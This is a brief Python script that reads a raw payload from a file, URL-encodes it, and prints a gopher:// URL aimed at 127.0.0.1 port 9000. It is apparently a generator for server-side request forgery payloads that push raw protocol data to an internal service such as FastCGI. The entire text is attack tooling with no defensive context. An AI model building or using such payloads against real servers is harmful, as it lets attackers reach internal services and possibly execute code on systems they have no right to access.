from urllib.parse import quote, unquote, urlencode

file = open('payload.txt','r')
payload = file.read()
print("gopher://127.0.0.1:9000/_"+quote(payload).replace("%0A","%0D").replace("%2F","/"))